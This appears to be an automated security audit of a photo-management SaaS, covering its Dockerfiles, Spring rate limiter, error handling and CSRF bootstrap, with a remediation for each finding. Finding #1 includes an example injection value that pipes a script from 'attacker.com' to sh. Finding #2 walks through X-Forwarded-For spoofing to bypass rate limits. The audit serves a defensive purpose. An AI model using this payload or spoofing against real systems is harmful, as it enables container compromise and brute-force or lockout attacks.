# Security Audit — Phase 4: React Frontend (SA9)

> **Audit date:** 2026-03-12
> **Auditor:** LCSA (automated)
> **Scope:** Implementation of `docs/plans/2026-02-25-saas-conversion-phase-4.md` — all backend prerequisites (Task 4.0) and frontend code (Tasks 4.1–4.9), plus supporting backend services, Dockerfiles, and nginx configuration.
> **Prior audits:** SA1–SA8 for this phase. This audit focuses on currently-implemented code, not plan text.
> **Materials reviewed:** 30+ source files across `api/`, `worker/`, `frontend/`, and `nginx.prod.conf`.

---

## Pass 1: Reconnaissance & Attack Surface Mapping

### Entry Points
| Entry Point | Auth Required | CSRF Required | Rate Limited |
|---|---|---|---|
| `POST /auth/register` | No | Yes | 20/hr per IP |
| `POST /auth/verify` | No | Yes | 20/hr per IP |
| `POST /auth/login` | No | Yes | 20/hr per IP |
| `POST /auth/refresh` | No (cookie) | **No** | 20/hr per IP |
| `POST /auth/logout` | No (cookie) | Yes | 20/hr per IP |
| `GET /api/users/me` | Yes (JWT) | No (GET) | 1000/hr per user |
| `PATCH /api/users/me` | Yes (JWT) | Yes | 1000/hr per user |
| `POST /photos/upload` | Yes (JWT) | Yes | 100/hr per user |
| `GET /photos` | Yes (JWT) | No (GET) | 1000/hr per user |
| `GET /photos/{id}` | Yes (JWT) | No (GET) | 1000/hr per user |
| `DELETE /photos/{id}` | Yes (JWT) | Yes | 1000/hr per user |
| `GET /search` | Yes (JWT) | No (GET) | 1000/hr per user |
| `GET /search/exif` | Yes (JWT) | No (GET) | 1000/hr per user |
| OAuth2 login flow | No | **No** | 20/hr per IP |

### Trust Boundaries
1. **Browser → nginx (TLS)** → **Spring Boot API** → **PostgreSQL (RLS)**
2. **Browser → MinIO (pre-signed URLs)** — no API intermediary
3. **Frontend auth store** → cookie-based JWT + refresh token rotation
4. **Redis** — rate limit buckets, refresh token storage

### Authentication Architecture
- JWT in httpOnly cookie (15-min expiry) + refresh token rotation (30-day expiry)
- CSRF via `CookieCsrfTokenRepository` with XOR BREACH protection
- OAuth2 (Google/GitHub) with server-side redirect flow
- RLS enforced at PostgreSQL level via `app.current_user_id` session variable

### Sensitive Data Flows
- Credentials: email/password in POST body → bcrypt at cost 12
- GPS coordinates: server-side filtering based on `showGps` preference (SA4-F1)
- Photo content: stored in MinIO, accessed via time-limited pre-signed URLs
- Refresh tokens: SHA-256 hashed in Redis, atomic rotation with replay detection

---

## Pass 2: Systematic Vulnerability Hunting

### Finding #1: api/Dockerfile ENTRYPOINT Shell Injection

**Vulnerability:** Command Injection via Environment Variable — OWASP A03 (Injection)
**Severity:** High
**Confidence:** Confirmed
**Attack Complexity:** Low

**Location:**
- File: `api/Dockerfile`, Line 12
- Related: `worker/Dockerfile`, Line 16 (already fixed by SA4-F2)

**Risk & Exploit Path:**
SA4-F2 identified and fixed this exact vulnerability in `worker/Dockerfile`, but the identical pattern in `api/Dockerfile` was not remediated. The shell-form ENTRYPOINT `["sh", "-c", "java $JAVA_OPTS -jar app.jar"]` combined with `ENV JAVA_OPTS` allows command injection if an attacker can override the `JAVA_OPTS` environment variable. In container orchestration environments (Kubernetes, Docker Compose with env overrides, CI/CD pipelines), environment variables can be set externally. A malicious value like `JAVA_OPTS="-jar /dev/null; curl attacker.com/shell.sh | sh #"` would execute arbitrary commands as the `appuser` user inside the container.

Preconditions: attacker must be able to set environment variables on the container (e.g., compromised CI/CD, misconfigured orchestration, supply-chain attack on env files).

**Evidence / Trace:**

```dockerfile
# api/Dockerfile
ENV JAVA_OPTS="-XX:MaxRAMPercentage=75.0 -XX:+UseG1GC"    # ← Overridable at runtime
ENTRYPOINT ["sh", "-c", "java $JAVA_OPTS -jar app.jar"]     # ← VULNERABLE: shell expansion
```

Contrast with the fixed worker/Dockerfile:
```dockerfile
# worker/Dockerfile (fixed by SA4-F2)
ENTRYPOINT ["/sbin/tini", "--", "java", "-XX:MaxRAMPercentage=75.0", "-jar", "app.jar"]  # ← exec-form, no shell
```

**Remediation:**

- **Primary fix:** Replace shell-form ENTRYPOINT with exec-form. Remove `ENV JAVA_OPTS` and inline the JVM flags:
  ```dockerfile
  # Remove: ENV JAVA_OPTS="-XX:MaxRAMPercentage=75.0 -XX:+UseG1GC"
  ENTRYPOINT ["java", "-XX:MaxRAMPercentage=75.0", "-XX:+UseG1GC", "-jar", "app.jar"]
  ```
- **Architectural improvement:** Pin the base image to a digest (see Finding #3). Consider adding `tini` as PID 1 init for proper signal handling, consistent with worker/Dockerfile.

**References:**
- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- SA4-F2 (prior audit finding — fixed in worker only)

---

### Finding #2: IP-Based Rate Limit Bypass via X-Forwarded-For Spoofing

**Vulnerability:** Rate Limit Bypass — OWASP A07 (Identification and Authentication Failures)
**Severity:** Medium
**Confidence:** High
**Attack Complexity:** Low

**Location:**
- File: `api/src/main/java/org/jphototagger/api/security/RateLimitFilter.java`, Lines 74–87
- File: `api/src/main/resources/application.yml`, Line 60
- File: `nginx.prod.conf`, Lines 98–101

**Risk & Exploit Path:**
The auth endpoint rate limiter keys on `request.getRemoteAddr()` (line 75). With `server.forward-headers-strategy: framework` (application.yml line 60), Spring's `ForwardedHeaderFilter` processes `X-Forwarded-For` headers and trusts all proxies unconditionally. Nginx uses `$proxy_add_x_forwarded_for` which **appends** the real client IP to any existing `X-Forwarded-For` value provided by the client. Spring's `ForwardedHeaderFilter` extracts the **leftmost** (attacker-controlled) IP.

Attack flow:
1. Attacker sends `POST /api/auth/login` with header `X-Forwarded-For: 10.0.0.1`
2. Nginx produces: `X-Forwarded-For: 10.0.0.1, 203.0.113.5` (real IP appended)
3. Spring extracts `10.0.0.1` as `getRemoteAddr()`
4. Rate limit key: `rate:auth:10.0.0.1` — attacker's real IP `203.0.113.5` is not rate-limited
5. Attacker cycles through spoofed IPs to get unlimited auth attempts

Nginx's own `limit_req` zone (10 req/min per `$binary_remote_addr`) still applies based on the real TCP source IP, capping throughput at ~600 req/hr. Combined with account lockout (5 attempts), targeted brute force is partially mitigated but not fully prevented.

**Evidence / Trace:**

```java
// RateLimitFilter.java:74-77
if (isAuthEndpoint(request)) {
    String clientIp = request.getRemoteAddr();  // ← VULNERABLE: attacker-controlled via X-Forwarded-For
    ConsumptionProbe probe = proxyManager.builder()
            .build("rate:auth:" + clientIp, this::authBucketConfig)
```

```yaml
# application.yml:60
server:
  forward-headers-strategy: framework   # Trusts ALL proxies — no IP allowlist
```

```nginx
# nginx.prod.conf:100
proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
# Appends real IP but preserves attacker-supplied prefix
```

**Remediation:**

- **Primary fix:** Switch from `framework` to `native` forwarded-headers strategy and configure Tomcat's `RemoteIpValve` with trusted proxy CIDR ranges (the Docker bridge network):
  ```yaml
  server:
    forward-headers-strategy: native
    tomcat:
      remoteip:
        remote-ip-header: X-Forwarded-For
        protocol-header: X-Forwarded-Proto
        internal-proxies: "172\\.\\d+\\.\\d+\\.\\d+|10\\.\\d+\\.\\d+\\.\\d+"
  ```
  With `native` strategy and configured `internal-proxies`, Tomcat's `RemoteIpValve` walks the `X-Forwarded-For` chain from right to left, skipping trusted proxy IPs, and extracts the first non-trusted IP as the client address.

- **Alternative fix:** Use `X-Real-IP` header (which nginx sets from `$remote_addr`, not appendable by clients) instead of `getRemoteAddr()`:
  ```java
  String clientIp = Optional.ofNullable(request.getHeader("X-Real-IP"))
          .orElse(request.getRemoteAddr());
  ```
  This is simpler but less portable across reverse proxy configurations.

- **Defense-in-depth:** Nginx should strip client-supplied `X-Forwarded-For` before appending:
  ```nginx
  proxy_set_header X-Forwarded-For $remote_addr;
  ```
  This replaces (not appends to) the header, ensuring only the directly-connecting IP is forwarded.

**References:**
- CWE-346: Origin Validation Error
- CWE-307: Improper Restriction of Excessive Authentication Attempts

---

### Finding #3: api/Dockerfile Base Image Not Digest-Pinned

**Vulnerability:** Supply Chain Risk — OWASP A06 (Vulnerable and Outdated Components)
**Severity:** Low
**Confidence:** Confirmed
**Attack Complexity:** High

**Location:**
- File: `api/Dockerfile`, Line 1

**Risk & Exploit Path:**
The API Dockerfile uses the floating tag `eclipse-temurin:21-jre-alpine` without a digest pin. A compromised Docker Hub account or a targeted tag mutation could inject malicious code into the base image. The worker Dockerfile is properly pinned with `@sha256:6ad8ed...`. A build today and a build tomorrow could produce containers with different base layers, violating reproducibility.

**Evidence / Trace:**

```dockerfile
# api/Dockerfile:1
FROM eclipse-temurin:21-jre-alpine          # ← No digest pin — mutable tag

# worker/Dockerfile:1 (correct)
FROM eclipse-temurin:21-jre-alpine@sha256:6ad8ed080d9be96b61438ec3ce99388e294af216ed57356000c06070e85c5d5d
```

**Remediation:**

- **Primary fix:** Pin the base image to a specific digest:
  ```dockerfile
  FROM eclipse-temurin:21-jre-alpine@sha256:<current-digest>
  ```
  Run `docker pull eclipse-temurin:21-jre-alpine && docker inspect --format='{{index .RepoDigests 0}}' eclipse-temurin:21-jre-alpine` to get the current digest.

---

### Finding #4: UnsupportedMediaTypeException Leaks Detected MIME Type

**Vulnerability:** Information Disclosure — OWASP A09 (Security Logging and Monitoring Failures) / A05 (Security Misconfiguration)
**Severity:** Low
**Confidence:** Confirmed
**Attack Complexity:** Low

**Location:**
- File: `api/src/main/java/org/jphototagger/api/service/PhotoService.java`, Line 136
- File: `api/src/main/java/org/jphototagger/api/controller/GlobalExceptionHandler.java`, Lines 96–99

**Risk & Exploit Path:**
When an upload is rejected due to unsupported MIME type, the exception message includes the Tika-detected MIME type: `"Unsupported media type: application/pdf"`. The `GlobalExceptionHandler` passes `ex.getMessage()` directly to the HTTP response body. This reveals the server's content analysis results to the client, disclosing:
1. That the server uses content-based MIME detection (not just extension-based)
2. The exact MIME type Tika determined for the uploaded content

While individually low-impact, this information helps an attacker understand server-side processing and craft targeted bypass attempts.

**Evidence / Trace:**

```java
// PhotoService.java:136
if (ext == null) {
    throw new UnsupportedMediaTypeException("Unsupported media type: " + mimeType);  // ← Leaks MIME type
}

// GlobalExceptionHandler.java:97-99
@ExceptionHandler(UnsupportedMediaTypeException.class)
public ResponseEntity<ErrorResponse> handleUnsupportedMediaType(UnsupportedMediaTypeException ex) {
    return ResponseEntity.status(HttpStatus.UNSUPPORTED_MEDIA_TYPE)
            .body(new ErrorResponse(ex.getMessage(), ...));  // ← Passes through to client
}
```

**Remediation:**

- **Primary fix:** Use a generic message in the exception handler, not `ex.getMessage()`:
  ```java
  @ExceptionHandler(UnsupportedMediaTypeException.class)
  public ResponseEntity<ErrorResponse> handleUnsupportedMediaType(UnsupportedMediaTypeException ex) {
      return ResponseEntity.status(HttpStatus.UNSUPPORTED_MEDIA_TYPE)
              .body(new ErrorResponse("Unsupported file type. Accepted: JPEG, PNG, TIFF, HEIC, WebP, CR2, NEF, ARW, DNG",
                      HttpStatus.UNSUPPORTED_MEDIA_TYPE.value()));
  }
  ```
  This is more helpful to legitimate users and does not reveal server-side analysis details.

---

### Finding #5: CSRF Bootstrap Relies on Implicit Side-Effect of 401 Response

**Vulnerability:** Security Misconfiguration / Fragile Design — OWASP A05 (Security Misconfiguration)
**Severity:** Low
**Confidence:** High
**Attack Complexity:** Low (to break during refactoring)

**Location:**
- File: `frontend/src/api/client.ts`, Lines 6–8
- File: `api/src/main/java/org/jphototagger/api/security/SecurityConfig.java`, Lines 76–78, 116–127

**Risk & Exploit Path:**
The frontend's CSRF bootstrap calls `GET /api/csrf` which is proxied to `GET /csrf`. No explicit controller handles this endpoint. The request is matched by `.anyRequest().authenticated()`, resulting in a 401 response. The CSRF cookie is set as a side-effect of the `CsrfCookieFilter` running **before** the authorization filter in the filter chain.

This works correctly today but is fragile:
1. If the filter chain order changes, the CSRF cookie may not be set on 401 responses
2. If someone adds a catch-all 401 handler that short-circuits the filter chain, the cookie won't be set
3. The behavior is non-obvious and undocumented — a future developer may "fix" the 401 by adding authentication

The frontend silently ignores the 401 response from the CSRF bootstrap — this is intentional but undocumented.

**Evidence / Trace:**

```typescript
// client.ts:6-8
export async function bootstrapCsrf(): Promise<void> {
  await fetch('/api/csrf', { credentials: 'include' });  // ← Response status ignored
}
```

```java
// SecurityConfig.java:76-78
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/auth/**", "/actuator/health").permitAll()
    .anyRequest().authenticated())  // ← /csrf requires auth → 401, but cookie is set by filter above
```

**Remediation:**

- **Primary fix:** Add `/csrf` (or a dedicated path like `/auth/csrf`) to the `permitAll()` list, and optionally create a minimal endpoint that returns 204:
  ```java
  // SecurityConfig.java
  .requestMatchers("/auth/**", "/actuator/health", "/csrf").permitAll()
  ```
  ```java
  // CsrfController.java (optional — the cookie is set by the filter, no body needed)
  @RestController
  public class CsrfController {
      @GetMapping("/csrf")
      public ResponseEntity<Void> csrf() {
          return ResponseEntity.noContent().build();
      }
  }
  ```
  This makes the CSRF bootstrap explicit, documented, and resilient to filter chain changes.

---

## Pass 3: Cross-Cutting & Compositional Analysis

### Chained Attacks
- **Finding #2 + Account Lockout:** The X-Forwarded-For spoofing bypasses the application-layer IP rate limit. Combined with the 5-attempt account lockout, an attacker could deliberately lock out targeted accounts by sending 5 failed login attempts with the victim's email. The nginx rate limit (10 req/min) slows but doesn't prevent this. This is a denial-of-service vector against specific user accounts.

### Implicit Trust Assumptions
- The frontend trusts `VITE_API_BASE_URL` to point to the legitimate API. In production, this is empty (same-origin via nginx proxy), eliminating cross-origin concerns. No issue.
- The `camelizeKeys` function correctly skips `exifData` to preserve EXIF key casing (SA4-F6).
- Pre-signed MinIO URLs are generated server-side with the public URL, preventing internal hostname leakage.

### Defense-in-Depth Assessment
- **GPS privacy:** Two layers — server-side filtering in `PhotoMetadataService.withoutGps()` + frontend DOM suppression in `MetadataPanel`. The IPTC and XMP location fields are also filtered. Robust.
- **XSS prevention:** React's default text node rendering + ESLint `react/no-danger: error` rule + backend Jsoup sanitization on EXIF strings. Three independent layers. Strong.
- **CSRF:** Cookie-based CSRF with XOR BREACH protection + `SameSite=Strict` on CSRF cookie + CSRF required on state-changing auth endpoints. Well-implemented.
- **Error handling:** Backend `server.error.include-stacktrace: never` + GlobalExceptionHandler with generic messages + frontend 200-char truncation. No stack trace leakage path found.

---

## 1. Executive Summary

The Phase 4 implementation demonstrates strong security engineering across the full stack. The CSRF implementation follows Spring Security's recommended SPA pattern, the JWT + refresh token rotation with replay detection is well-architected, and the multi-layer GPS privacy enforcement (server-side stripping + DOM suppression) properly protects sensitive location data. The search implementation uses parameterized queries with EXIF field whitelisting, and the RLS enforcement at the PostgreSQL level provides robust tenant isolation.

Two findings require attention before production deployment: the API Dockerfile retains the same shell-expansion ENTRYPOINT vulnerability that SA4-F2 identified and fixed in the worker Dockerfile, and the IP-based auth rate limiting can be bypassed via X-Forwarded-For header spoofing due to Spring's unconditional proxy trust. Neither is remotely exploitable without additional preconditions (container env override for Finding #1; the nginx rate limit partially mitigates Finding #2), but both should be remediated.

The three Low-severity findings represent best-practice improvements: digest-pinning the API base image for supply chain safety, suppressing internal MIME type details in error responses, and making the CSRF bootstrap explicit rather than relying on filter-chain ordering side effects.

## 2. Findings Summary Table

| # | Title | Category | Severity | Confidence | Similar Instances | Status |
|---|-------|----------|----------|------------|-------------------|--------|
| 1 | api/Dockerfile ENTRYPOINT Shell Injection | A03 — Injection | High | Confirmed | 1 (worker was fixed) | BLOCK |
| 2 | Rate Limit Bypass via X-Forwarded-For Spoofing | A07 — Auth Failures | Medium | High | 1 | FIX |
| 3 | api/Dockerfile Base Image Not Digest-Pinned | A06 — Supply Chain | Low | Confirmed | 1 | FIX |
| 4 | UnsupportedMediaTypeException Leaks MIME Type | A05/A09 — Misconfig | Low | Confirmed | 1 | FIX |
| 5 | CSRF Bootstrap Relies on 401 Side-Effect | A05 — Misconfig | Low | High | 1 | FIX |

## 3. Security Quality Score (SQS)

| Finding Severity | Count | Deduction |
|-----------------|-------|-----------|
| High            | 1     | −20       |
| Medium          | 1     | −8        |
| Low             | 3     | −6        |

**Raw Score:** 100 − 20 − 8 − 6 = **66/100**

**Hard gates triggered:** No (no unremediated Critical findings, no known CVEs with EPSS ≥ 0.2, no hardcoded secrets)

**Final SQS:** 66/100
**Posture:** Unacceptable — block deployment, remediate Finding #1 (High) before release.

> **Note:** The High-severity Dockerfile finding requires container environment variable override as a precondition, which lowers practical exploitability. However, the fix is trivial (one-line Dockerfile change identical to the worker fix), and the same vulnerability class was already identified and blocked in SA4-F2 for the worker. Applying the same fix to the API Dockerfile raises the score to **86/100** (Strong posture) since no High findings would remain.

## 4. Positive Security Observations

1. **Refresh token rotation with replay detection:** The atomic `GETDEL` Lua script prevents TOCTOU races during token rotation, and the family-based replay detection correctly revokes all tokens in a compromised family. This is a production-grade implementation.

2. **Comprehensive GPS privacy enforcement:** The `PhotoMetadataResponse.withoutGps()` method strips GPS coordinates, all `GPS:*` EXIF keys (case-insensitive), IPTC location fields, and XMP location fields. Combined with frontend DOM suppression, GPS data has no path to the user when `showGps=false`.

3. **Parameterized queries throughout:** All database access uses JPA named parameters or Spring Data derived queries. The search EXIF filter uses a server-side `ALLOWED_EXIF_FIELDS` whitelist with Jackson-generated JSON for the JSONB `@>` operator, preventing injection. Sort injection is prevented by hardcoded `ORDER BY` clauses and `PageRequest.of(page, size)` without Sort parameters.

4. **Defense-in-depth error handling:** Backend suppresses stack traces (`include-stacktrace: never`) and raw exception messages (`include-message: never`). The `GlobalExceptionHandler` returns generic messages for all exception types. The frontend truncates error bodies to 200 characters. No information leakage path was found.

5. **Timing side-channel mitigation in authentication:** The login flow always performs bcrypt comparison (even for non-existent users via a dummy hash), and registration performs bcrypt encoding on duplicate emails to equalize timing. The `@Async` email dispatch prevents the email send duration from creating a timing difference.

## 5. Prioritized Remediation Roadmap

| Priority | Finding | Why | Effort | Owner |
|----------|---------|-----|--------|-------|
| 1 | #1 — api/Dockerfile ENTRYPOINT | Identical to SA4-F2 (already blocked for worker). Trivial fix, high consistency value. | Quick Win | DevOps |
| 2 | #2 — X-Forwarded-For rate limit bypass | Enables targeted account lockout DoS and reduces brute-force protection. Fix requires nginx config + Spring config changes. | Moderate | Backend / DevOps |
| 3 | #3 — Base image digest pin | Supply chain hardening. One command to get the digest, one-line edit. | Quick Win | DevOps |
| 4 | #4 — MIME type in error response | Replace `ex.getMessage()` with a helpful generic message listing accepted formats. | Quick Win | Backend |
| 5 | #5 — Explicit CSRF endpoint | Add `/csrf` to `permitAll()` and optionally create a 204 endpoint. Eliminates fragile implicit behavior. | Quick Win | Backend |
